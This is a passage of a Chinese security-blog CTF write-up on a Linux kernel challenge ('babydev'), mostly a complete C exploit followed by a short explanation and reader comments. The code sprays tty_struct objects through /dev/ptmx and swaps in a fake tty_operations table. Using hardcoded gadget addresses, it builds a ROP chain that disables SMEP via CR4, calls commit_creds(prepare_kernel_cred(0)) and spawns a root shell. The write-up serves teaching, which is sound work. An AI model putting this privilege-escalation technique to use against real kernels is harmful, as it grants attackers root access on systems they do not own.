+15.#define&nbsp;TTY_STRUCT_SIZE&nbsp;0x2e0
+16.#define&nbsp;SPRAY_ALLOC_TIMES&nbsp;0x100
+17.
+18.int&nbsp;spray_fd[0x100];
+19.
+20./*
+21.
+22.tty_struct:
+23.&nbsp;int&nbsp;magic;&nbsp;//&nbsp;4
+24.&nbsp;struct&nbsp;kref&nbsp;kref;&nbsp;//&nbsp;4
+25.&nbsp;struct&nbsp;device&nbsp;*dev;&nbsp;//&nbsp;8
+26.&nbsp;struct&nbsp;tty_driver&nbsp;*driver;&nbsp;//&nbsp;8
+27.&nbsp;const&nbsp;struct&nbsp;tty_operations&nbsp;*ops;&nbsp;//&nbsp;8,&nbsp;offset&nbsp;=&nbsp;4&nbsp;+&nbsp;4&nbsp;+&nbsp;8&nbsp;+&nbsp;8&nbsp;=&nbsp;24
+28.&nbsp;[...]
+29.
+30.*/
+31.
+32.struct&nbsp;tty_operations&nbsp;{
+33.&nbsp;struct&nbsp;tty_struct&nbsp;*&nbsp;(*lookup)(struct&nbsp;tty_driver&nbsp;*driver,
+34.&nbsp;struct&nbsp;file&nbsp;*filp,&nbsp;int&nbsp;idx);
+35.&nbsp;int&nbsp;(*install)(struct&nbsp;tty_driver&nbsp;*driver,&nbsp;struct&nbsp;tty_struct&nbsp;*tty);
+36.&nbsp;void&nbsp;(*remove)(struct&nbsp;tty_driver&nbsp;*driver,&nbsp;struct&nbsp;tty_struct&nbsp;*tty);
+37.&nbsp;int&nbsp;(*open)(struct&nbsp;tty_struct&nbsp;*&nbsp;tty,&nbsp;struct&nbsp;file&nbsp;*&nbsp;filp);
+38.&nbsp;void&nbsp;(*close)(struct&nbsp;tty_struct&nbsp;*&nbsp;tty,&nbsp;struct&nbsp;file&nbsp;*&nbsp;filp);
+39.&nbsp;void&nbsp;(*shutdown)(struct&nbsp;tty_struct&nbsp;*tty);
+40.&nbsp;void&nbsp;(*cleanup)(struct&nbsp;tty_struct&nbsp;*tty);
+41.&nbsp;int&nbsp;(*write)(struct&nbsp;tty_struct&nbsp;*&nbsp;tty,
+42.&nbsp;const&nbsp;unsigned&nbsp;char&nbsp;*buf,&nbsp;int&nbsp;count);
+43.&nbsp;int&nbsp;(*put_char)(struct&nbsp;tty_struct&nbsp;*tty,&nbsp;unsigned&nbsp;char&nbsp;ch);
+44.&nbsp;void&nbsp;(*flush_chars)(struct&nbsp;tty_struct&nbsp;*tty);
+45.&nbsp;int&nbsp;(*write_room)(struct&nbsp;tty_struct&nbsp;*tty);
+46.&nbsp;int&nbsp;(*chars_in_buffer)(struct&nbsp;tty_struct&nbsp;*tty);
+47.&nbsp;int&nbsp;(*ioctl)(struct&nbsp;tty_struct&nbsp;*tty,
+48.&nbsp;unsigned&nbsp;int&nbsp;cmd,&nbsp;unsigned&nbsp;long&nbsp;arg);
+49.&nbsp;long&nbsp;(*compat_ioctl)(struct&nbsp;tty_struct&nbsp;*tty,
+50.&nbsp;unsigned&nbsp;int&nbsp;cmd,&nbsp;unsigned&nbsp;long&nbsp;arg);
+51.&nbsp;void&nbsp;(*set_termios)(struct&nbsp;tty_struct&nbsp;*tty,&nbsp;struct&nbsp;ktermios&nbsp;*&nbsp;old);
+52.&nbsp;void&nbsp;(*throttle)(struct&nbsp;tty_struct&nbsp;*&nbsp;tty);
+53.&nbsp;void&nbsp;(*unthrottle)(struct&nbsp;tty_struct&nbsp;*&nbsp;tty);
+54.&nbsp;void&nbsp;(*stop)(struct&nbsp;tty_struct&nbsp;*tty);
+55.&nbsp;void&nbsp;(*start)(struct&nbsp;tty_struct&nbsp;*tty);
+56.&nbsp;void&nbsp;(*hangup)(struct&nbsp;tty_struct&nbsp;*tty);
+57.&nbsp;int&nbsp;(*break_ctl)(struct&nbsp;tty_struct&nbsp;*tty,&nbsp;int&nbsp;state);
+58.&nbsp;void&nbsp;(*flush_buffer)(struct&nbsp;tty_struct&nbsp;*tty);
+59.&nbsp;void&nbsp;(*set_ldisc)(struct&nbsp;tty_struct&nbsp;*tty);
+60.&nbsp;void&nbsp;(*wait_until_sent)(struct&nbsp;tty_struct&nbsp;*tty,&nbsp;int&nbsp;timeout);
+61.&nbsp;void&nbsp;(*send_xchar)(struct&nbsp;tty_struct&nbsp;*tty,&nbsp;char&nbsp;ch);
+62.&nbsp;int&nbsp;(*tiocmget)(struct&nbsp;tty_struct&nbsp;*tty);
+63.&nbsp;int&nbsp;(*tiocmset)(struct&nbsp;tty_struct&nbsp;*tty,
+64.&nbsp;unsigned&nbsp;int&nbsp;set,&nbsp;unsigned&nbsp;int&nbsp;clear);
+65.&nbsp;int&nbsp;(*resize)(struct&nbsp;tty_struct&nbsp;*tty,&nbsp;struct&nbsp;winsize&nbsp;*ws);
+66.&nbsp;int&nbsp;(*set_termiox)(struct&nbsp;tty_struct&nbsp;*tty,&nbsp;struct&nbsp;termiox&nbsp;*tnew);
+67.&nbsp;int&nbsp;(*get_icount)(struct&nbsp;tty_struct&nbsp;*tty,
+68.&nbsp;struct&nbsp;serial_icounter_struct&nbsp;*icount);
+69.&nbsp;const&nbsp;struct&nbsp;file_operations&nbsp;*proc_fops;
+70.};
+71.
+72.typedef&nbsp;int&nbsp;__attribute__((regparm(3)))(*commit_creds_func)(unsigned&nbsp;long&nbsp;cred);
+73.typedef&nbsp;unsigned&nbsp;long&nbsp;__attribute__((regparm(3)))&nbsp;(*prepare_kernel_cred_func)(unsigned&nbsp;long&nbsp;cred);
+74.
+75./*&nbsp;Gadgets&nbsp;*/
+76.commit_creds_func&nbsp;commit_creds&nbsp;=&nbsp;(commit_creds_func)&nbsp;0xffffffff810a1420;
+77.prepare_kernel_cred_func&nbsp;prepare_kernel_cred&nbsp;=&nbsp;(prepare_kernel_cred_func)&nbsp;0xffffffff810a1810;
+78.unsigned&nbsp;long&nbsp;native_write_cr4&nbsp;=&nbsp;0xFFFFFFFF810635B0;
+79.unsigned&nbsp;long&nbsp;xchgeaxesp&nbsp;=&nbsp;0xFFFFFFFF81007808;
+80.unsigned&nbsp;long&nbsp;poprdiret&nbsp;=&nbsp;0xFFFFFFFF813E7D6F;
+81.//unsigned&nbsp;long&nbsp;iretq&nbsp;=&nbsp;0xFFFFFFFF8181A797;
+82.unsigned&nbsp;long&nbsp;iretq&nbsp;=&nbsp;0xffffffff814e35ef;
+83.unsigned&nbsp;long&nbsp;swapgs&nbsp;=&nbsp;0xFFFFFFFF81063694;
+84.
+85./*&nbsp;status&nbsp;*/
+86.unsigned&nbsp;long&nbsp;user_cs,&nbsp;user_ss,&nbsp;user_eflags;
+87.void&nbsp;save_stats()&nbsp;{
+88.&nbsp;asm(
+89.&nbsp;&quot;movq&nbsp;%%cs,&nbsp;%0\n&quot;
+90.&nbsp;&quot;movq&nbsp;%%ss,&nbsp;%1\n&quot;
+91.&nbsp;&quot;pushfq\n&quot;
+92.&nbsp;&quot;popq&nbsp;%2\n&quot;
+93.&nbsp;:&quot;=r&quot;(user_cs),&nbsp;&quot;=r&quot;(user_ss),&nbsp;&quot;=r&quot;(user_eflags)
+94.&nbsp;:
+95.&nbsp;:&nbsp;&quot;memory&quot;
+96.&nbsp;);
+97.}
+98.
+99.void&nbsp;get_shell()&nbsp;{
+100.&nbsp;//&nbsp;char&nbsp;*shell_str&nbsp;=&nbsp;&quot;/bin/sh&quot;;
+101.&nbsp;//&nbsp;char&nbsp;*args[]&nbsp;=&nbsp;{shell_str,&nbsp;NULL};
+102.&nbsp;//&nbsp;execve(shell_str,&nbsp;args,&nbsp;NULL);
+103.&nbsp;system(&quot;/bin/sh&quot;);
+104.}
+105.
+106.void&nbsp;shellcode()&nbsp;{
+107.&nbsp;commit_creds(prepare_kernel_cred(0));
+108.}
+109.
+110.void&nbsp;exploit()&nbsp;{
+111.&nbsp;char&nbsp;*buf&nbsp;=&nbsp;(char*)&nbsp;malloc(0x1000);
+112.&nbsp;char&nbsp;*fake_file_operations&nbsp;=&nbsp;(char*)&nbsp;calloc(0x1000,&nbsp;1);&nbsp;//&nbsp;big&nbsp;enough&nbsp;to&nbsp;be&nbsp;file_operations
+113.&nbsp;struct&nbsp;tty_operations&nbsp;*fake_tty_operations&nbsp;=&nbsp;(struct&nbsp;tty_operations&nbsp;*)&nbsp;malloc(sizeof(struct&nbsp;tty_operations));
+114.&nbsp;
+115.&nbsp;save_stats();
+116.&nbsp;
+117.&nbsp;memset(fake_tty_operations,&nbsp;0,&nbsp;sizeof(struct&nbsp;tty_operations));
+118.&nbsp;fake_tty_operations-&gt;proc_fops&nbsp;=&nbsp;&amp;fake_file_operations;
+119.&nbsp;fake_tty_operations-&gt;ioctl&nbsp;=&nbsp;(unsigned&nbsp;long)xchgeaxesp;
+120.&nbsp;
+121.&nbsp;int&nbsp;fd1&nbsp;=&nbsp;open(&quot;/dev/babydev&quot;,&nbsp;O_RDWR);
+122.&nbsp;int&nbsp;fd2&nbsp;=&nbsp;open(&quot;/dev/babydev&quot;,&nbsp;O_RDWR);
+123.&nbsp;int&nbsp;fd;
+124.&nbsp;//ioctl(fd2,&nbsp;0x10001,&nbsp;0xa8);&nbsp;//&nbsp;the&nbsp;same&#39;11&nbsp;as&nbsp;cred&nbsp;struct&nbsp;size
+125.&nbsp;ioctl(fd2,&nbsp;0x10001,&nbsp;TTY_STRUCT_SIZE);
+126.&nbsp;write(fd2,&nbsp;&quot;hello&nbsp;world&quot;,&nbsp;strlen(&quot;hello&nbsp;world&quot;));
+127.&nbsp;close(fd1);
+128.&nbsp;fd&nbsp;=&nbsp;fd2;
+129.&nbsp;
+130.&nbsp;//&nbsp;spray&nbsp;tty
+131.&nbsp;puts(&quot;[+]&nbsp;Spraying&nbsp;buffer&nbsp;with&nbsp;tty_struct&quot;);
+132.&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;SPRAY_ALLOC_TIMES;&nbsp;i++)&nbsp;{
+133.&nbsp;spray_fd[i]&nbsp;=&nbsp;open(&quot;/dev/ptmx&quot;,&nbsp;O_RDWR&nbsp;|&nbsp;O_NOCTTY);&nbsp;
+134.&nbsp;if&nbsp;(spray_fd[i]&nbsp;&lt;&nbsp;0)&nbsp;{
+135.&nbsp;perror(&quot;open&nbsp;tty&quot;);
+136.&nbsp;}
+137.&nbsp;}
+138.&nbsp;
+139.&nbsp;//&nbsp;now&nbsp;we&nbsp;have&nbsp;a&nbsp;tty_struct&nbsp;in&nbsp;our&nbsp;buffer
+140.&nbsp;puts(&quot;[+]&nbsp;Reading&nbsp;buffer&nbsp;content&nbsp;from&nbsp;kernel&nbsp;buffer&quot;);
+141.&nbsp;long&nbsp;size&nbsp;=&nbsp;read(fd,&nbsp;buf,&nbsp;32);
+142.&nbsp;&nbsp;if&nbsp;(size&nbsp;&lt;&nbsp;32)&nbsp;{
+143.&nbsp;puts(&quot;[-]&nbsp;Reading&nbsp;not&nbsp;complete!&quot;);
+144.&nbsp;printf(&quot;[-]&nbsp;Only&nbsp;%ld&nbsp;bytes&nbsp;read.\n&quot;,&nbsp;size);
+145.&nbsp;}
+146.&nbsp;puts(&quot;[+]&nbsp;Detecting&nbsp;buffer&nbsp;content&nbsp;type&quot;);
+147.&nbsp;if&nbsp;(buf[0]&nbsp;!=&nbsp;0x01&nbsp;||&nbsp;buf[1]&nbsp;!=&nbsp;0x54)&nbsp;{
+148.&nbsp;puts(&quot;[-]&nbsp;tty_struct&nbsp;spray&nbsp;failed&quot;);
+149.&nbsp;printf(&quot;[-]&nbsp;We&nbsp;should&nbsp;have&nbsp;0x01&nbsp;and&nbsp;0x54,&nbsp;instead&nbsp;we&nbsp;got&nbsp;%02x&nbsp;%02x\n&quot;,&nbsp;buf[0],&nbsp;buf[1]);
+150.&nbsp;puts(&quot;[-]&nbsp;Exiting...&quot;);
+151.&nbsp;exit(-1);
+152.&nbsp;}
+153.&nbsp;
+154.&nbsp;puts(&quot;[+]&nbsp;Spray&nbsp;complete.&nbsp;Modifying&nbsp;function&nbsp;pointer&quot;);
+155.&nbsp;unsigned&nbsp;long&nbsp;*temp&nbsp;=&nbsp;(unsigned&nbsp;long*)&amp;buf[24];
+156.&nbsp;*temp&nbsp;=&nbsp;(unsigned&nbsp;long)fake_tty_operations;
+157.&nbsp;
+158.&nbsp;puts(&quot;[+]&nbsp;Preparing&nbsp;ROP&nbsp;chain&quot;);
+159.&nbsp;unsigned&nbsp;long&nbsp;lower_address&nbsp;=&nbsp;xchgeaxesp&nbsp;&amp;&nbsp;0xFFFFFFFF;
+160.&nbsp;unsigned&nbsp;long&nbsp;base&nbsp;=&nbsp;lower_address&nbsp;&amp;&nbsp;~0xfff;
+161.&nbsp;printf(&quot;[+]&nbsp;Base&nbsp;address&nbsp;is&nbsp;%lx\n&quot;,&nbsp;base);
+162.&nbsp;if&nbsp;(mmap(base,&nbsp;0x30000,&nbsp;7,&nbsp;MAP_PRIVATE&nbsp;|&nbsp;MAP_ANONYMOUS,&nbsp;-1,&nbsp;0)&nbsp;!=&nbsp;base)&nbsp;{
+163.&nbsp;&nbsp;perror(&quot;mmap&quot;);
+164.&nbsp;exit(1);
+165.&nbsp;}
+166.&nbsp;
+167.&nbsp;unsigned&nbsp;long&nbsp;rop_chain[]&nbsp;=&nbsp;{
+168.&nbsp;poprdiret,
+169.&nbsp;0x6f0,
+170.&nbsp;native_write_cr4,
+171.&nbsp;(unsigned&nbsp;long)shellcode,
+172.&nbsp;swapgs,
+173.&nbsp;base,
+174.&nbsp;iretq,
+175.&nbsp;(unsigned&nbsp;long)get_shell,
+176.&nbsp;user_cs,
+177.&nbsp;user_eflags,
+178.&nbsp;base&nbsp;+&nbsp;0x10000,
+179.&nbsp;user_ss
+180.&nbsp;};
+181.&nbsp;memcpy((void*)lower_address,&nbsp;rop_chain,&nbsp;sizeof(rop_chain));
+182.&nbsp;
+183.&nbsp;puts(&quot;[+]&nbsp;Writing&nbsp;function&nbsp;pointer&nbsp;to&nbsp;the&nbsp;driver&quot;);
+184.&nbsp;long&nbsp;len&nbsp;=&nbsp;write(fd,&nbsp;buf,&nbsp;32);
+185.&nbsp;if&nbsp;(len&nbsp;&lt;&nbsp;0)&nbsp;{
+186.&nbsp;perror(&quot;write&quot;);
+187.&nbsp;exit(1);
+188.&nbsp;}
+189.&nbsp;
+190.&nbsp;puts(&quot;[+]&nbsp;Triggering&quot;);
+191.&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;i&nbsp;&lt;&nbsp;256;&nbsp;i++)&nbsp;{
+192.&nbsp;ioctl(spray_fd[i],&nbsp;0,&nbsp;0);&nbsp;//FFFFFFFF814D8AED&nbsp;call&nbsp;rax
+193.&nbsp;}
+194.&nbsp;
+195.}
+196.
+197.int&nbsp;main()&nbsp;{
+198.&nbsp;exploit();
+199.&nbsp;return&nbsp;0;
+200.}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">其中，tty_struct和tty_operations都是从源码里找到的结构，不太需要解释，file_operations的存在主要是给他一个有效的指针，避免一些可能出现的错误，然后save_state函数用来保存用户空间的cs、eflags、ss的值，在iretq的时候，需要提供rip，cs,eflags,用户栈位置，ss值，所以我们要提前保存好备用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过打开/dev/ptmx设备，我们就新建了tty_struct。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过计算tty_struct的大小，提前使用ioctl将buf的大小设置为一样的大小，之后新建tty_struct的时候,tty_struct就会落在这个buf里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后我们通过修改tty_struct的tty_operations，设置为我们自己的tty_operations即可，我们自己的tty_operations再修改ioctl为xchg esp, eax来使得rsp指向用户空间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而这里的位置我们提前mmap，放入rop_chain的内容，这样xchg之后rsp就指向了rop_chain开始的位置，进入了rop流程啦，最后rop结束，执行完毕，打开了root shell，提权成功！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过这道题目，我们大致了解了内核ctf题目的一个流程，还学习了利用tty_struct配合rop绕过smep进行利用的一个手法，当然，还学习了直接通过cred结构进行利用的手法，以及，我们知道了内核的漏洞和用户空间的不同之处，要按多线程的思路去考虑。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我觉得最重要的是，通过这篇文章，这道题目，我们知道了内核和用户空间的差异，以及怎么样去完成一个内核利用，和最最重要的，在不明白的时候，看！源！码！ linux是个开源的操作系统，一定要利用好开源的优势，不懂的时候多去看看源码，一切都会简单许多。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	<a href="http://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html">http://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.	<a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/syscall-2.html">https://0xax.gitbooks.io/linux-insides/content/SysCall/syscall-2.html</a>&nbsp;</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/4148.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】一道简单内核题入门内核利用 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4148" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/11x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16190" user-name="小虎" href="javascript:;">
+                小虎            </a>
+                        <span class="comment-time">2017-08-19 23:40:40</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16190">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16190" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">6666666666666666</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/1x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15827" user-name="网络安全小学生" href="javascript:;">
+                网络安全小学生            </a>
+                        <span class="comment-time">2017-08-13 15:02:05</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15827">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15827" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">很屌很屌。</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/2x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15535" user-name="linkerrors" href="javascript:;">
+                linkerrors            </a>
+                        <span class="comment-time">2017-07-27 10:21:22</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15535">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15535" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@我叫0day谁找我_: Anciety的linux kernel pwn450利用方法出来了，相比tty_struct，用cred占位更简单，甚至不用喷射，学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/1x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15534" user-name="bipabol" href="javascript:;">
+                bipabol            </a>
+                        <span class="comment-time">2017-07-26 22:51:28</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15534">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15534" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@我叫0day谁找我_:Anciety的linux kernel pwn450利用方法出来了，相比tty_struct，用cred占位更简单，甚至不用喷射，学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/6x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15533" user-name="evan的家" href="javascript:;">
+                evan的家            </a>
+                        <span class="comment-time">2017-07-26 22:21:27</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15533">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15533" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@我叫0day谁找我_:Anciety的linux kernel pwn450利用方法出来了，相比tty_struct，用cred占位更简单，甚至不用喷射，学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/3x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15530" user-name="T4erg" href="javascript:;">
+                T4erg            </a>
+                        <span class="comment-time">2017-07-26 20:51:25</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15530">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15530" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@我叫0day谁找我_: Anciety的linux kernel pwn450利用方法出来了，相比tty_struct，用cred占位更简单，甚至不用喷射，学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/2x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15529" user-name="vendanner" href="javascript:;">
+                vendanner            </a>
+                        <span class="comment-time">2017-07-26 20:41:24</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15529">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15529" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">学习 @我的印象笔记 //@小禾才露尖尖角54: //@我叫0day谁找我_: Anciety的linux kernel pwn450利用方法出来了，相比tty_struct，用cred占位更简单，甚至不用喷射，学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/4x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15523" user-name="语暖心扉" href="javascript:;">
+                语暖心扉            </a>
+                        <span class="comment-time">2017-07-26 16:31:23</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15523">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15523" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@我叫0day谁找我_: Anciety的linux kernel pwn450利用方法出来了，相比tty_struct，用cred占位更简单，甚至不用喷射，学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/11x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15522" user-name="21号新秀GFY" href="javascript:;">
+                21号新秀GFY            </a>
+                        <span class="comment-time">2017-07-26 15:41:25</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15522">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15522" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">码</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/7x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15517" user-name="_New乌托邦" href="javascript:;">
+                _New乌托邦            </a>
+                        <span class="comment-time">2017-07-26 14:31:22</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15517">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15517" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@我叫0day谁找我_:Anciety的linux kernel pwn450利用方法出来了，相比tty_struct，用cred占位更简单，甚至不用喷射，学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4148" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
